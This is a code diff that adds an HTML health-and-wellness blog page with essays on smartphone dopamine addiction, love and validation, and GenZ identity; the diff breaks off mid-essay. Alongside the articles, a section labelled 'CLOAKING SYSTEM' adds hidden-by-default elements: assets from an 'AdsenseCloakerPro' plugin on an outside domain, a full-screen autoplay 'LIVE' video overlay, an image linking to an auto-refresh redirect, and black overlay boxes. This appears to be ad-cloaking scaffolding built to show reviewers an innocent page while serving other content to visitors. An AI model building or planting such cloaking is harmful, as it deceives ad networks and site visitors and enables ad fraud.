@@ -1,0 +1,1549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  
+  <!-- Primary SEO -->
+  <title>Daily Health & Wellness - Expert Health Tips & Advice</title>
+  <meta name="description" content="Daily health tips, wellness advice, and expert insights for a healthier lifestyle. Your trusted source for health, mental well-being, fitness, and nutrition.">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://yourdomain.com/">
+
+  <!-- Open Graph / Facebook -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Daily Health & Wellness - Expert Health Tips & Advice">
+  <meta property="og:description" content="Daily health tips, wellness advice, and expert insights to help you live a healthier, happier life every day.">
+  <meta property="og:url" content="https://yourdomain.com/">
+  <meta property="og:site_name" content="Daily Health & Wellness">
+  <!-- Replace with your real image -->
+  <meta property="og:image" content="https://yourdomain.com/og-image.jpg">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Daily Health & Wellness - Expert Health Tips & Advice">
+  <meta name="twitter:description" content="Evidence-based health tips, mental wellness stories, fitness, and nutrition guidance.">
+  <meta name="twitter:image" content="https://yourdomain.com/og-image.jpg">
+
+  <!-- Basic structured data for the site -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebSite",
+    "name": "Daily Health & Wellness",
+    "url": "https://yourdomain.com/",
+    "potentialAction": {
+      "@type": "SearchAction",
+      "target": "https://yourdomain.com/?s={search_term_string}",
+      "query-input": "required name=search_term_string"
+    }
+  }
+  </script>
+
+  <style>
+    /* ============================================
+       GLOBAL STYLES
+       ============================================ */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    html, body {
+      width: 100%;
+      overflow-x: hidden;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background: #f5f7fa;
+      color: #2d3748;
+      line-height: 1.6;
+    }
+    
+    /* ============================================
+       HEADER & NAVIGATION
+       ============================================ */
+    .header {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 1.5rem 0;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      position: sticky;
+      top: 0;
+      z-index: 20;
+    }
+    
+    .header-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+    
+    .logo {
+      font-size: 1.8rem;
+      font-weight: 700;
+      text-decoration: none;
+      color: white;
+      letter-spacing: 0.03em;
+    }
+    
+    .logo span {
+      color: #fbbf24;
+    }
+    
+    .nav {
+      display: flex;
+      gap: 1.5rem;
+      flex-wrap: wrap;
+    }
+    
+    .nav a {
+      color: white;
+      text-decoration: none;
+      font-weight: 500;
+      transition: opacity 0.3s, border-color 0.3s;
+      padding: 0.5rem 0;
+      border-bottom: 2px solid transparent;
+      font-size: 0.95rem;
+    }
+    
+    .nav a:hover {
+      opacity: 0.9;
+      border-bottom-color: #fbbf24;
+    }
+    
+    /* ============================================
+       MAIN CONTAINER
+       ============================================ */
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 2rem 20px 3rem;
+      display: grid;
+      grid-template-columns: minmax(0, 2.3fr) minmax(260px, 1fr);
+      gap: 2rem;
+      align-items: flex-start;
+    }
+    
+    @media (max-width: 968px) {
+      .container {
+        grid-template-columns: 1fr;
+      }
+    }
+    
+    /* ============================================
+       HERO SECTION
+       ============================================ */
+    .hero {
+      grid-column: 1 / -1;
+      background: white;
+      border-radius: 16px;
+      padding: 3rem 2.5rem;
+      margin-bottom: 2rem;
+      box-shadow: 0 10px 30px rgba(15, 23, 42, 0.08);
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at top left, rgba(102,126,234,0.16), transparent 55%);
+      pointer-events: none;
+    }
+    
+    .hero h1 {
+      font-size: 2.6rem;
+      color: #1a202c;
+      margin-bottom: 0.75rem;
+    }
+    
+    .hero p {
+      font-size: 1.1rem;
+      color: #4a5568;
+      max-width: 700px;
+      margin: 0.5rem auto 0;
+    }
+    
+    /* ============================================
+       BLOG POSTS
+       ============================================ */
+    .main-content {
+      display: flex;
+      flex-direction: column;
+      gap: 2rem;
+      max-width: 780px;
+      width: 100%;
+    }
+    
+    .blog-post {
+      background: white;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 4px 18px rgba(15, 23, 42, 0.06);
+      transition: transform 0.25s ease, box-shadow 0.25s ease;
+      border: 1px solid #e2e8f0;
+    }
+    
+    .blog-post:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 14px 30px rgba(15, 23, 42, 0.12);
+    }
+    
+    .post-image {
+      width: 100%;
+      height: 220px;
+      background: radial-gradient(circle at top left, #667eea, #764ba2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 3rem;
+    }
+    
+    .post-content {
+      padding: 1.75rem 1.75rem 1.5rem;
+    }
+    
+    .post-meta {
+      display: flex;
+      gap: 1rem;
+      font-size: 0.9rem;
+      color: #718096;
+      margin-bottom: 0.75rem;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+    
+    .post-category {
+      background: #eef2ff;
+      padding: 0.25rem 0.75rem;
+      border-radius: 999px;
+      font-size: 0.8rem;
+      color: #4c51bf;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+    }
+    
+    .post-title {
+      font-size: 1.5rem;
+      color: #1a202c;
+      margin-bottom: 0.85rem;
+      line-height: 1.3;
+    }
+    
+    .post-title a {
+      color: inherit;
+      text-decoration: none;
+      transition: color 0.25s ease;
+    }
+    
+    .blog-post:hover .post-title a {
+      color: #4c51bf;
+    }
+    
+    .post-preview {
+      color: #4a5568;
+      margin-bottom: 0.75rem;
+      line-height: 1.7;
+      font-size: 0.98rem;
+    }
+    
+    .post-preview p {
+      margin-bottom: 0.75rem;
+      color: #4a5568;
+    }
+    
+    .post-preview p:last-child {
+      margin-bottom: 0;
+    }
+    
+    .post-preview h3 {
+      margin-top: 1.5rem;
+      margin-bottom: 1rem;
+      color: #1a202c;
+      font-size: 1.2rem;
+      font-weight: 600;
+    }
+    
+    .post-preview em {
+      font-style: italic;
+      color: #4a5568;
+      display: block;
+      margin: 1rem 0;
+      padding-left: 1rem;
+      border-left: 3px solid #667eea;
+    }
+    
+    .post-full-content {
+      display: none;
+      color: #4a5568;
+      margin-top: 0.75rem;
+      line-height: 1.7;
+      font-size: 0.98rem;
+      animation: fadeIn 0.3s ease-in;
+    }
+    
+    .post-full-content.show {
+      display: block;
+    }
+    
+    .post-full-content p {
+      margin-bottom: 0.75rem;
+      color: #4a5568;
+    }
+    
+    .post-full-content p:last-child {
+      margin-bottom: 0;
+    }
+    
+    .post-full-content h3 {
+      margin-top: 1.25rem;
+      margin-bottom: 0.75rem;
+      color: #1a202c;
+      font-size: 1.2rem;
+      font-weight: 600;
+    }
+    
+    .post-full-content em {
+      font-style: italic;
+      color: #4a5568;
+      display: block;
+      margin: 0.75rem 0;
+      padding-left: 1rem;
+      border-left: 3px solid #667eea;
+    }
+    
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-6px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    
+    .read-more {
+      display: inline-block;
+      color: #4c51bf;
+      text-decoration: none;
+      font-weight: 600;
+      transition: color 0.25s ease;
+      cursor: pointer;
+      margin-top: 0.25rem;
+      font-size: 0.95rem;
+    }
+    
+    .read-more:hover {
+      color: #764ba2;
+    }
+    
+    .read-more.active {
+      color: #764ba2;
+    }
+    
+    /* ============================================
+       SIDEBAR
+       ============================================ */
+    .sidebar {
+      display: flex;
+      flex-direction: column;
+      gap: 2rem;
+    }
+    
+    .sidebar-widget {
+      background: white;
+      border-radius: 16px;
+      padding: 1.5rem;
+      box-shadow: 0 4px 16px rgba(15, 23, 42, 0.06);
+      border: 1px solid #e2e8f0;
+    }
+    
+    .widget-title {
+      font-size: 1.2rem;
+      color: #1a202c;
+      margin-bottom: 1rem;
+      padding-bottom: 0.75rem;
+      border-bottom: 2px solid #edf2f7;
+      font-weight: 700;
+    }
+    
+    .category-list {
+      list-style: none;
+    }
+    
+    .category-list li {
+      margin-bottom: 0.75rem;
+    }
+    
+    .category-list a {
+      color: #4a5568;
+      text-decoration: none;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: color 0.2s ease, transform 0.2s ease;
+      font-size: 0.95rem;
+    }
+    
+    .category-list a:hover {
+      color: #4c51bf;
+      transform: translateX(1px);
+    }
+    
+    .category-count {
+      background: #edf2f7;
+      padding: 0.25rem 0.55rem;
+      border-radius: 999px;
+      font-size: 0.8rem;
+      color: #718096;
+    }
+    
+    .popular-post {
+      display: flex;
+      gap: 0.9rem;
+      margin-bottom: 1rem;
+      padding-bottom: 1rem;
+      border-bottom: 1px solid #edf2f7;
+    }
+    
+    .popular-post:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+      padding-bottom: 0;
+    }
+    
+    .popular-post-image {
+      width: 70px;
+      height: 70px;
+      background: radial-gradient(circle at top left, #667eea, #764ba2);
+      border-radius: 10px;
+      flex-shrink: 0;
+    }
+    
+    .popular-post-content h4 {
+      font-size: 0.95rem;
+      margin-bottom: 0.35rem;
+    }
+    
+    .popular-post-content a {
+      color: #1a202c;
+      text-decoration: none;
+      transition: color 0.2s ease;
+    }
+    
+    .popular-post-content a:hover {
+      color: #4c51bf;
+    }
+    
+    .popular-post-content .date {
+      font-size: 0.85rem;
+      color: #718096;
+    }
+    
+    .ad-container {
+      background: #f7fafc;
+      border: 2px dashed #cbd5e0;
+      border-radius: 12px;
+      padding: 2rem;
+      text-align: center;
+      color: #a0aec0;
+      min-height: 250px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.95rem;
+    }
+    
+    /* ============================================
+       FOOTER
+       ============================================ */
+    .footer {
+      background: #1a202c;
+      color: white;
+      padding: 3rem 20px 2rem;
+      margin-top: 2.5rem;
+    }
+    
+    .footer-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 2rem;
+    }
+    
+    .footer-section h3 {
+      margin-bottom: 1rem;
+      color: #fbbf24;
+      font-size: 1.05rem;
+    }
+    
+    .footer-section p,
+    .footer-section a {
+      color: #cbd5e0;
+      text-decoration: none;
+      line-height: 1.9;
+      font-size: 0.95rem;
+    }
+    
+    .footer-section a:hover {
+      color: #fbbf24;
+    }
+    
+    .footer-bottom {
+      max-width: 1200px;
+      margin: 2rem auto 0;
+      text-align: center;
+      padding-top: 1.5rem;
+      border-top: 1px solid #2d3748;
+      color: #a0aec0;
+      font-size: 0.85rem;
+    }
+    
+    /* ============================================
+       RESPONSIVE
+       ============================================ */
+    @media (max-width: 768px) {
+      .hero {
+        padding: 2rem 1.5rem;
+      }
+      
+      .hero h1 {
+        font-size: 2rem;
+      }
+      
+      .hero p {
+        font-size: 0.98rem;
+      }
+      
+      .header-container {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      
+      .nav {
+        justify-content: flex-start;
+      }
+      
+      .post-title {
+        font-size: 1.3rem;
+      }
+
+      .post-content {
+        padding: 1.4rem 1.25rem 1.25rem;
+      }
+    }
+  </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+      <!-- ===== CLOAKING SYSTEM STYLES ===== -->
+  <style>
+    .video-container {
+        position: fixed;
+        opacity: 1;
+        width: 100%;
+        z-index: 9999;
+        top: 35%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+  
+    .live-indicator {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        display: flex;
+        align-items: center;
+        z-index: 10000;
+    }
+  
+    .live-dot {
+        width: 10px;
+        height: 10px;
+        background-color: red;
+        border-radius: 50%;
+        margin-right: 8px;
+        animation: blink 1s infinite;
+    }
+  
+    .live-badge {
+        background-color: red;
+        color: white;
+        padding: 2px 5px;
+        font-weight: bold;
+        font-size: 10px;
+    }
+  
+    @keyframes blink {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.3; }
+    }
+  
+    .close-button {
+        position: absolute;
+        top: 1px;
+        right: 2px;
+        cursor: pointer;
+        z-index: 10001;
+        background: transparent;
+    }
+  
+    .full-width-image {
+        width: 100%;
+        display: block;
+    }
+  
+    /* Hide cloaking elements by default */
+    .cloaking-video, .cloaking-background, .cloaking-overlay {
+        display: none;
+    }
+  
+    /* Cloaking overlay styles */
+    .Mai-Box-Of-Box, #Mai-Box-Of-Box, [id^="Mai-Box-Of-Box-"] {
+        position: relative;
+    }
+  
+    [id^="Box-Of-Box-"] {
+        position: absolute;
+        left: 0;
+        top: 0;
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        pointer-events: none;
+        z-index: 10;
+        opacity: 1;
+    }
+    </style>
+</head>
+<body>
+  <!-- ===== CLOAKING SYSTEM ELEMENTS (Hidden by default) ===== -->
+  <div class="video-container cloaking-video">
+      <div class="close-button" id="closeVideoButton">
+          <img src="https://sl.kaysdogs.com/wp-content/plugins/AdsenseCloakerPro/template-assets/images/icon/btn_close.gif" alt="close">
+      </div>
+
+      <div class="live-indicator">
+          <div class="live-dot"></div>
+          <div class="live-badge">LIVE</div>
+      </div>
+
+      <video id="videoplayer" autoplay loop muted playsinline webkit-playsinline disablepictureinpicture 
+             poster="https://sl.kaysdogs.com/wp-content/plugins/AdsenseCloakerPro/template-assets/images/default/6.jpg"
+             style="width: 100%; height: auto; max-width: 100%;">
+      </video>
+  </div>
+
+  <!-- Background image -->
+  <div class="full-width-image cloaking-background">
+      <a href="https://sl.kaysdogs.com/55079k?auto_refresh=1&target=kaya" 
+         style="text-decoration: none; color:#FFFFFF;">
+          <img src="https://cloud.actionarcadearena.com/irw/boks/30.webp" 
+               class="img-fluid" style="display:block; width:100%;">
+      </a>
+  </div>
+
+  <!-- Cloaking overlays -->
+  <div class="cloaking-overlay">
+      <div id="Mai-Box-Of-Box">
+          <div id="Box-Of-Box-37"></div>
+          <div style="width: 300px; height: 100px; display: inline-block; background-color: black;"></div>
+      </div>
+
+      <div id="Mai-Box-Of-Box">
+          <div id="Box-Of-Box-55"></div>
+          <div style="width: 300px; height: 100px; display: inline-block; background-color: black;">Ajdojj</div>
+      </div>
+
+      <div id="Mai-Box-Of-Box">
+          <div id="Box-Of-Box-44"></div>
+          <div style="width: 300px; height: 300px; display: inline-block; background-color: black;">Ajdojj</div>
+      </div>
+  </div>
+
+  <!-- Header -->
+  <!-- Header -->
+  <header class="header">
+    <div class="header-container">
+      <a href="/" class="logo">Daily <span>Health</span> &amp; Wellness</a>
+      <nav class="nav">
+        <a href="/">Home</a>
+        <a href="/category/nutrition">Nutrition</a>
+        <a href="/category/fitness">Fitness</a>
+        <a href="/category/mental-health">Mental Health</a>
+        <a href="/category/wellness-tips">Wellness Tips</a>
+        <a href="/about">About</a>
+      </nav>
+    </div>
+  </header>
+
+  <!-- Main Container -->
+  <div class="container">
+    <!-- Hero Section -->
+    <div class="hero">
+      <h1>Your Daily Guide to Better Health</h1>
+      <p>Discover expert tips, wellness advice, and evidence-based information to help you live a healthier, happier life every day.</p>
+    </div>
+
+    <!-- Main Content -->
+    <main class="main-content">
+
+      <!-- NEW Blog Post: Smartphone Dopamine / Anhedonia -->
+      <article class="blog-post" itemscope itemtype="https://schema.org/BlogPosting">
+        <div class="post-image">📱</div>
+        <div class="post-content">
+          <div class="post-meta">
+            <span class="post-category" itemprop="articleSection">Mental Health</span>
+          </div>
+          <h2 class="post-title" itemprop="headline">
+            <a href="/smartphone-dopamine-addiction" itemprop="url">
+              The Smartphone Dopamine Trap: Anhedonia in the Age of Endless Scrolling
+            </a>
+          </h2>
+
+          <!-- Preview -->
+          <div class="post-preview" style="white-space: pre-line; line-height: 1.5;" itemprop="description">
+            <p>If you’re reading this, the likelihood is you have a smartphone addiction.</p>
+            <p>Some days, like millions of other humans, you lack motivation, dread performing basic tasks, and occasionally feel numb or anxious. If you find yourself feeling those things, or worse yet, find yourself struggling to finish an article… that’s not just “laziness”.</p>
+            <p>Cheap dopamine in the form of smartphones may be “the modern devil” — and it’s quietly rewiring the reward system in your brain.</p>
+          </div>
+
+          <!-- Full Content -->
+          <div class="post-full-content" style="white-space: pre-line; line-height: 1.6;">
+
+            <h3>We Don’t Talk Honestly About Smartphone Addiction</h3>
+            <p>
+              Smartphone use, like any other addiction, carries a layer of shame.  
+              Most of us don’t admit we have a problem, but when we look closely,  
+              we know something is off. We call it “being tired”, “burnt out”,  
+              or “lazy”, but underneath there is an uncomfortable truth —  
+              our phones are training our brains.
+            </p>
+            <p>
+              When we talk about epidemics, we think of something like COVID.  
+              But the evidence suggests we are living through an addiction epidemic,  
+              where our ability to regulate dopamine is being hijacked by  
+              highly capable predictive systems: social media algorithms and smartphones.
+            </p>
+
+            <h3>What the Data Says</h3>
+            <p>Some numbers that paint the picture:</p>
+            <ul>
+              <li>Global smartphone usage rose from about 20% to over 70% since 2010.</li>
+              <li>Average smartphone usage is around 4 hours 40 minutes per day.</li>
+              <li>Phone pickups have exploded from ~46 checks/day to over 150.</li>
+              <li>Almost half of adults report frequent stress, the highest in decades.</li>
+              <li>People report worsening sleep and rising anxiety.</li>
+              <li>Suicide rates have risen dramatically over the last two decades.</li>
+              <li>Pedestrian deaths linked to distracted attention are sharply up.</li>
+            </ul>
+            <p>
+              These trends are not random. They correlate with increased digital consumption  
+              and reward-seeking behaviour — especially through screens.
+            </p>
+
+            <h3>Our Biology Was Built for Scarcity, Not Infinite Scroll</h3>
+            <p>
+              For most of human history, we lived in scarcity — hunting, foraging, conserving energy.  
+              Our reward circuits evolved to search for:
+            </p>
+            <ul>
+              <li>Calories and sugar</li>
+              <li>Novelty</li>
+              <li>Social approval and belonging</li>
+            </ul>
+            <p>
+              These rewards were rare and usually required effort.  
+              Today, for the first time in history, the average human lives in a state of abundance:
+            </p>
+            <ul>
+              <li>Instant digital stimulation</li>
+              <li>Highly processed, hyper-palatable food</li>
+              <li>Endless novelty on demand</li>
+              <li>Constant social comparison & validation via apps</li>
+            </ul>
+            <p>
+              Our brains were not designed for this level of intensity and access.  
+              When dopamine is stimulated too frequently and too strongly,  
+              the brain responds by downregulating sensitivity —  
+              your reward system becomes numb. Pleasure is harder to feel,  
+              so you seek more stimulation to feel “normal”.
+            </p>
+
+            <h3>Primitive Brains vs Advanced Machine Learning</h3>
+            <p>
+              Our species has never faced persuasion systems that operate  
+              directly at the neural level, optimising for our attention.
+            </p>
+            <p>
+              Modern social media algorithms are built on advanced ML recommender systems  
+              trained on our behaviour. Their goal:
+            </p>
+            <ul>
+              <li>Maximise time-on-device</li>
+              <li>Maximise engagement</li>
+              <li>Maximise retention</li>
+            </ul>
+            <p>
+              They don’t need to understand you — they only need to predict you.
+            </p>
+            <p>
+              As Nick Bostrom’s orthogonality thesis explains,  
+              intelligence (ability to achieve goals) and goals (what is actually pursued)  
+              are independent. In our case, the “goal” of the system is not  
+              human flourishing — it is attention and ad revenue.
+            </p>
+            <p>
+              Applied here, the misalignment is simple:  
+              you want a meaningful life, your apps want your time.  
+              Repeated billions of times, this misalignment creates  
+              a collective addiction problem.
+            </p>
+
+            <h3>The War Inside Your Brain: Limbic System vs Prefrontal Cortex</h3>
+            <p>
+              Every time we buy short-term digital stimulation,  
+              we steal from our future capacity to feel joy.
+            </p>
+            <p>
+              Dr. Anna Lembke describes this using the pleasure–pain balance.  
+              Each hit of dopamine tilts the seesaw toward pleasure.  
+              In response, the brain pushes back with pain to restore balance.  
+              It does this by:
+            </p>
+            <ul>
+              <li>Reducing dopamine receptor availability</li>
+              <li>Decreasing sensitivity to reward</li>
+            </ul>
+            <p>
+              Over time, this leads to anhedonia — the inability to feel pleasure.  
+              You still move through life, but everything feels muted and flat.  
+              To escape that dullness, your brain returns to  
+              what produced the last big spike: your phone, your apps, your feeds.
+            </p>
+            <p>
+              High-dopamine, low-effort behaviours (scrolling, streaming, notifications)  
+              create fast spikes and sharp crashes.  
+              Effort-based rewards (exercise, learning, deep work, real connection)  
+              produce gentler, more sustainable dopamine curves.
+            </p>
+
+            <h3>Smartphones Are Drug-Like</h3>
+            <p>
+              The process of addiction is nearly identical whether the source is  
+              a substance or a screen. Chronic overuse of dopamine-producing stimuli:
+            </p>
+            <ul>
+              <li>Drives compulsive use</li>
+              <li>Collapses motivation</li>
+              <li>Makes effort-based tasks feel “not worth it”</li>
+            </ul>
+            <p>
+              In famous experiments, rats given extended access to cocaine  
+              chose it over food and water, even to the point of death.  
+              Their dopamine deficit became so severe that survival behaviour  
+              no longer produced enough reward.
+            </p>
+            <p>
+              With smartphones, we see a softer version of the same pattern:  
+              basic life tasks start feeling empty, while the phone always feels  
+              like the easiest way to feel “something”.
+            </p>
+
+            <h3>Red Pill or Blue Pill: Two Paths</h3>
+            <h4>Path 1: Stay Plugged In</h4>
+            <p>
+              We can continue sleep-walking into a digital world designed to harvest  
+              attention. Operating systems are the portal, apps the operators,  
+              AI the fine-tuner, and human users the product.  
+              Like in The Matrix, we become batteries — not for energy,  
+              but for data, time, and emotional engagement.
+            </p>
+
+            <h4>Path 2: The Anti-Movement</h4>
+            <p>
+              Or, we can recognise what this really is: a war for attention,  
+              agency, and self-mastery. Those who don’t realise a war has begun  
+              lose by default.
+            </p>
+            <p><strong>The anti-movement is simple:</strong></p>
+            <ul>
+              <li>Do hard things that your brain resists.</li>
+              <li>Do “boring” things your brain resents.</li>
+              <li>Don’t engage with apps that numb you.</li>
+              <li>Go on that run instead of scrolling.</li>
+              <li>Don’t watch videos while eating.</li>
+              <li>Finish that chapter instead of checking notifications.</li>
+            </ul>
+            <p>
+              Studies suggest ~60 days of this is enough to begin reshaping  
+              those unhealthy neural pathways into healthier ones.
+            </p>
+
+            <h3>Practical Tools for the Battle</h3>
+            <ul>
+              <li><strong>App blockers:</strong> Use tools like Opal to limit when you can use certain apps and see how often you reach for your phone automatically.</li>
+              <li><strong>Red-light mode before bed:</strong> For 2 hours before sleep, avoid social media and stimulating content. Use red-light or low-blue-light settings.</li>
+              <li><strong>No phone in the bedroom:</strong> Don’t sleep with your phone in the same room and avoid checking it within the first hour of waking up.</li>
+              <li><strong>Grayscale mode:</strong> Turn your phone screen to grayscale during the day to make it less visually rewarding.</li>
+              <li><strong>Put your phone out of reach:</strong> When working, put it somewhere that requires real effort to retrieve. Even another room or a drawer helps.</li>
+              <li><strong>Meditation:</strong> Practice mindfulness for 20–30 minutes a day. Simply observing thoughts can slow down your mind.</li>
+              <li><strong>Reading:</strong> Learn about dopamine and addiction. Books like “Dopamine Nation” (Dr. Anna Lembke) can change how you view pleasure, pain, and craving.</li>
+            </ul>
+
+            <p>
+              The goal is not to become anti-technology.  
+              The goal is to reclaim your brain so that technology serves you,  
+              not the other way around.
+            </p>
+          </div>
+
+          <a href="#" class="read-more" onclick="toggleReadMore(this); return false;">Read More →</a>
+        </div>
+      </article>
+
+      <!-- Blog Post 1 (old, now second) -->
+      <article class="blog-post" itemscope itemtype="https://schema.org/BlogPosting">
+        <div class="post-image">❤️</div>
+        <div class="post-content">
+          <div class="post-meta">
+            <span class="post-category" itemprop="articleSection">Mental Health</span>
+          </div>
+          <h2 class="post-title" itemprop="headline">
+            <a href="/is-it-love-or-validation" itemprop="url">Is It Love or Validation?</a>
+          </h2>
+          <div class="post-preview" style="white-space: pre-line; line-height: 1.5;" itemprop="description">
+            <p>Mind picks words in a certain way. When we think about those words, we get an idea of them - the idea passed on to us by the society around us through content consumed over centuries.</p>
+
+            <p>Words carry the weight of collective imagination. So when we think about love, our mind doesn't just think, it recalls an inherited picture - a beautiful partner giving us their full attention, smiling like we're the only one in the world.</p>
+          </div>
+          <div class="post-full-content" style="white-space: pre-line; line-height: 1.6;">
+            <p>But if we look at this projection carefully, we begin to see something uncomfortable.</p>
+            <p>The mind doesn't care much about love itself - it simply wants someone to act in a way that makes us feel good.</p>
+            <p>That act could be anything - checking up on us, saying the right words, giving us time, presence, praise.</p>
+            <p>The mind seeks attention and frames it as love.</p>
+            <p>And we end up chasing that attention our whole life, calling it love. We start equating being noticed with being loved.</p>
+            <p>The moment that attention starts to divide, when more people enter the family or responsibilities increase, the illusion of love begins to fade.</p>
+            <p>We feel like the other person doesn't love us anymore, like something important has slipped away.</p>
+            <p>But in reality, nothing was taken from us.</p>
+            <p>The truth is, love was never supposed to be an act of validation. It was never meant to be a test we constantly pass or fail.</p>
+            <p>It was never meant to be a confirmation of whether someone cared or not.</p>
+            <p>It was never supposed to be about changing ourselves just to fit into the ideal template of love between couples - a template built from someone else's longing and someone else's need for certainty.</p>
+            <p>We force ourselves into this idea of love again and again, losing pieces of who we are in the process.</p>
+            <p>We try to fit into a model reinforced by a few minds who were also seeking validation for their idea of love.</p>
+            <p>We mimic their stories, we measure our emotions against theirs, and somewhere along the way we forget to feel what's truly ours.</p>
+            <p>We lose our lives trying to validate those stories, that content, that imagination, while missing out on the real love that may already be present.</p>
+            <p>The kind of love that doesn't look like the movies, doesn't speak in big words, doesn't ask for applause.</p>
+            <p>The love from partners we never identified. Partners who didn't fit into the widely accepted template of love.</p>
+            <p>Partners who never asked for validation from us, but we were too distracted, too conditioned, too blind to notice.</p>
+            <p>And by the time we do realise it, those partners become just a memory.</p>
+            <p>A faded photograph in our mind.</p>
+            <p>A voice we once knew. A presence we no longer feel. We are left to live in a version of life where we keep pretending to be loved, but deep down we know we're not.</p>
+            <p>And it's difficult to accept that.</p>
+            <p>It's a truth too heavy to sit with, so we turn away.</p>
+            <p>And maybe that's what we've always done - turned away from the real thing while chasing the image.</p>
+          </div>
+          <a href="#" class="read-more" onclick="toggleReadMore(this); return false;">Read More →</a>
+        </div>
+      </article>
+
+      <!-- Blog Post 2 -->
+      <article class="blog-post">
+        <div class="post-image">🧠</div>
+        <div class="post-content">
+          <div class="post-meta">
+            <span class="post-category">Mental Health</span>
+          </div>
+          <h2 class="post-title">
+            <a href="/genz-burden-of-connection-and-confusion">GenZ: The Burden of Connection and Confusion</a>
+          </h2>
+          <div class="post-preview" style="white-space: pre-line; line-height: 1.5;">
+            <p>GenZ carry a strange burden. They are more connected than ever, yet more confused. They are praised when they perform and ignored when they stumble. They are constantly comparing themselves to strangers on screens and losing sight of who they are. Beneath all this noise, timeless questions rise up:</p>
+
+            <p>Who am I? What is passion? Why am I lonely? What does success even mean?</p>
+          </div>
+          <div class="post-full-content" style="white-space: pre-line; line-height: 1.6;">
+            <h3 style="margin-top: 1.5rem; margin-bottom: 1rem; color: #1a202c; font-size: 1.3rem;">Who Am I?</h3>
+            <p>Am I just the son following my parents' commands?</p>
+            <p>Am I part of a group where I am only trying to prove my worth?</p>
+            <p>Am I a puppet working for the desires shown to me by social media?</p>
+            <p>Am I a soul that gets excused when I hit failures?</p>
+            <p>Am I just a lost cause in a world that seems unfair to me?</p>
+            <p>Maybe I am clueless. Maybe I am still figuring it out. Maybe the question does not matter at all.</p>
+            <p>For most youth, identity does not matter as long as they perform. If they are praised by family, validated by friends, or applauded by society, life feels stable. But when performance drops because of emotional disruption or failure, the applause stops. Without applause, the question of identity rises. That question can send youth spiraling into illusions, drugs, or shallow spirituality just to hide the pain inside.</p>
+            <p>But identity cannot be built on masks. To understand who we are, we need to remember what we once were.</p>
+            <h3 style="margin-top: 1.5rem; margin-bottom: 1rem; color: #1a202c; font-size: 1.3rem;">The Toddler's Truth</h3>
+            <p>When you were a few months old, you were simply observing. You mirrored what you saw. You reached for what you loved. You fell without labeling it as failure. You lived with pure awareness.</p>
+            <p>Babies carry evolved tendencies, seeds of the soul, that guide them. As we grow, those tendencies fade from the waking mind, but they never disappear. They wait in the subconscious and reappear when we think we are in control, only to knock us off balance. We call it unfair, but it is not. Life is reminding us of the friend we abandoned, our truest self.</p>
+            <p>That friend, once ignored, becomes an enemy. It resists, sabotages, and confuses us. When we welcome it again with full awareness, it flips back into a guide. That is the same awareness that guided us as toddlers. To meet it again is to return to joy flowing effortlessly from the heart.</p>
+            <h3 style="margin-top: 1.5rem; margin-bottom: 1rem; color: #1a202c; font-size: 1.3rem;">What Is Passion?</h3>
+            <p>Passion is one of the most misused words today.</p>
+            <p>Is it something borrowed from society, or something nurtured in silence until it becomes the only thing that matters? If you cannot sacrifice comfort, approval, or even relationships for it, then it is not passion. It is attraction.</p>
+            <p>Many confuse thrill for passion. A startup after watching Shark Tank. A job chosen for prestige. A path followed for applause. Thrill excites but does not sustain. It is the same impulse that makes you chase novelty but leaves you empty afterward. Escape feeds the ego. Passion feeds the soul.</p>
+            <p>The difference lies in repetition. Escape loses its flavor. Passion deepens with every return. Passion survives boredom, resistance, and failure. If you can keep showing up when nobody is clapping, when success looks far, when it is just you and the work, that is passion.</p>
+            <p>True passion is not found in a moment of inspiration but discovered over time, through adversity, through immersion, through discipline. Slowly, the work becomes a gateway to the self, and the joy it brings becomes an anchor you cannot trade away.</p>
+            <h3 style="margin-top: 1.5rem; margin-bottom: 1rem; color: #1a202c; font-size: 1.3rem;">Loneliness: From Void to Awakening</h3>
+            <p>Loneliness is born of self-doubt. It appears when you feel you cannot meet society's expectations anymore, when you feel misunderstood, when you feel lost in the race for resources and roles.</p>
+            <p>Often, we play roles that bring comfort to others while draining ourselves. We think we are in the right place until the breakdown comes. And then masks fall. We see who people really are when we no longer serve their comfort.</p>
+          </div>
